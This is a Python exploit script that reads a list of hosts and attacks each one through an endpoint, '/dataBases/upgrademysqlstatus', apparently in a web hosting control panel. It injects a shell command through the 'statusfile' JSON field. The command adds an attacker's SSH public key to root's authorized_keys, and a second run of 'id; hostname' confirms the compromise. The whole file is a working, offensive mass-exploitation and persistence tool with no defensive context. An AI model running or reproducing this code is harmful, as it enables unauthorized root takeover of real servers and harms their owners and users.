#!/usr/bin/env python3
import sys,json,re,requests,urllib3
urllib3.disable_warnings()
UA={"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) Chrome/126 Safari/537.36"}
PUB = """ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII8pgh3fkk8mhhHbMQKrwLOlblRqPZ/jx7Np5LzIhtZz kops@base"""
def rce(host, cmd, scheme="https"):
    base = scheme + "://" + host
    s = requests.Session(); s.verify = False; s.headers.update(UA)
    r = s.get(base + "/", timeout=15, allow_redirects=False)
    m = re.search(r"csrftoken=([A-Za-z0-9]+)", str(r.headers))
    tok = m.group(1) if m else s.cookies.get("csrftoken")
    if not tok:
        s.get(base + "/login/", timeout=15); tok = s.cookies.get("csrftoken")
    if not tok: return None
    p = {"statusfile": "/dev/null; " + cmd + "; #", "csrftoken": tok}
    e = s.put(base + "/dataBases/upgrademysqlstatus", json=p, timeout=15,
              headers={"X-CSRFToken": tok, "Content-Type": "application/json", "Referer": base + "/"})
    return e.text
def clean(t):
    return re.sub(r"[^\x20-\x7e]", "", t or "")[:300]
CMD = ("mkdir -p /root/.ssh && chmod 700 /root/.ssh && "
       "(grep -qF 'kops@base' /root/.ssh/authorized_keys 2>/dev/null || echo '" + PUB + "' >> /root/.ssh/authorized_keys) && "
       "chmod 600 /root/.ssh/authorized_keys && echo INSTALLED_OK")
for line in open(sys.argv[1]):
    h = line.strip()
    if not h: continue
    out = {"host": h}
    try:
        t = clean(rce(h, CMD))
        out["install"] = t
        v = clean(rce(h, "id; hostname; ls -l /root/.ssh/authorized_keys | head -2"))
        out["verify"] = v
    except Exception as e:
        out["err"] = str(e)[:70]
    print(json.dumps(out), flush=True)
